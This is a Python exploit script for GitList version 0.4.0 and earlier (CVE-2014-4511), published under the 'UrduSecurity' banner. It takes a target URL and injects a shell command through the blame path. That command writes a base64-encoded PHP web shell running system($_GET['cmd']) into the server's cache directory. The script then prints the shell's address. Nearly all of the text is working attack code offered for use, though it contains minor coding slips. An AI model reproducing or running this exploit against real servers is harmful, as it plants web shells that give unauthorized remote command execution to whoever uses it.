#!/usr/bin/python

# Gitlist <= 0.4.0 RCE
# Date: 06/20/2014
# Author: Muhammad Adeel
# Vendor: http://gitlist.org/
# Vulnerable SW: https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz
# Version: <= 0.4.0
# Solution: 0.5.0
# Tested: Debian 7

import commands,sys,urllib

def banner():
	print '''
	-- UrduSecurity Exploits --
	-- GitList 0.4.0 RCE Exploit CVE-2014-4511--
	-- Auhtor: Muhammad Adeel --
	-- http://urdusecurity.blogspot.com --\n'''

banner()
_url_ = raw_input('Enter Target Url: ')
_url_ = _url_ if _url_[-1] != '/' else _url_[:-1]
_Rce_ = "/var/www/gitlist/cache"
_payload_ = "PD9zeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pgo=" # <?system($_GET['cmd']);?>
_attack_ = '/blame/master/""`echo {0}|base64 -d > {1}/UrduSecurity.php`'.format(_payload_,_Rce_)

def GetShell():
	print "[+] Injection RCE on Following Location %s" % _Rce_
	pre_url = _url_ + urllib.quote(_attack_)
	ExecShellCmd = getoutput("wget %s" % pre_url)
	if '500' in ExecShellCmd:
		print "[+] Connect to Shell at: %s/cache/UrduSecurity.php?cmd=ls" % _url_.split('/', 1)[0]
	else:
		print "[-] Unable to Exploit! May be Patched." 
		print ExecShellCmd

GetShell()

def main():
	banner()
	if __name__ == '__main__':
		main()
